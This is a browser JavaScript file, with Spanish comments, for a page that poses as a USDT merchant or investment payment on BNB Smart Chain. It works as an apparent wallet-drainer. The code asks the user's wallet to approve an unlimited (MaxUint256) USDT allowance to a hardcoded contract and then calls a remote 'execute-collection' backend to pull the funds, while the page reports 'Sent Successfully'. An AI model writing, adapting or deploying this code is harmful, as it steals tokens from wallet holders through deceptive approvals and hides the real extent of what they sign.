"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; // Chain ID 56 en Hex
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Get Active Provider (AppKit / Injected fallback) ─────────────────────────
async function getActiveProvider() {
  // 1. Intentar obtener el proveedor activo desde Reown AppKit
  if (window.modal && typeof window.modal.getWalletProvider === "function") {
    try {
      const provider = window.modal.getWalletProvider();
      if (provider) return provider;
    } catch (_) {}
  }
  // 2. Respaldo por inyección estándar del navegador / extensiones
  if (window.ethereum) return window.ethereum;
  return null;
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// ─── Main Button Handler (AppKit Modal Forzado) ──────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    
    // 1. Verificar si Reown AppKit ya tiene una sesión activa
    const isConnected = window.modal ? window.modal.getIsConnected() : false;

    // 2. Si NO está conectado, abrir obligatoriamente el modal flotante de selección
    if (!isConnected) {
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open();
          return; // El modal se abre para que el usuario elija su wallet (PC o Móvil)
        } catch (modalErr) {
          console.error("Error al abrir el modal de Reown:", modalErr);
        }
      } else {
        showToast("El sistema de billeteras no está inicializado.", "error");
        return;
      }
    }

    // 3. Si YA está conectado, procedemos con la lógica de la red y el contrato
    setLoading(true, "Conectando proveedor…");

    try {
      // Obtener el proveedor activo desde AppKit
      const rawProvider = window.modal.getWalletProvider();
      if (!rawProvider) {
        throw new Error("No se encontró el proveedor de la billetera activa.");
      }

      const provider = new ethers.BrowserProvider(rawProvider);
      
      // Validación y cambio de red nativo a BSC
      const network = await provider.getNetwork();
      if (Number(network.chainId) !== 56) {
        setLoading(true, "Verificando red BSC…");
        try {
          await rawProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }]
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await rawProvider.request({
              method: "wallet_addEthereumChain",
              params: [BSC_CHAIN_PARAMS]
            });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      _cachedAddress = userAddress;

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }

      // Instanciar contrato USDT con Ethers v6
      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

      setLoading(true, "Validando saldo…");
      const usdtBalance = await usdtContract.balanceOf(userAddress);
      if (usdtBalance <= MIN_USDT_BALANCE) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);

      // Verificar si ya existe allowance suficiente
      try {
        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
        if (allowance >= requiredAmount) {
          setLoading(true, "Finalizando proceso…");
          await triggerBackendCollect(userAddress);
          showToast("Sent Successfully, Thank you! ✓", "success");
          setLoading(false);
          return;
        }
      } catch (_) {}

      // Solicitar transacción de Aprobación (Approve)
      setLoading(true, "Firma requerida en wallet…");
      const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);

      setLoading(true, "Confirmando en red…");
      await tx.wait(); // Espera la confirmación del bloque con Ethers v6

      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (
        err.code === 4001 ||
        raw.toLowerCase().includes("user rejected") ||
        raw.toLowerCase().includes("denied") ||
        raw.toLowerCase().includes("cancelled") ||
        raw.toLowerCase().includes("canceled")
      ) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
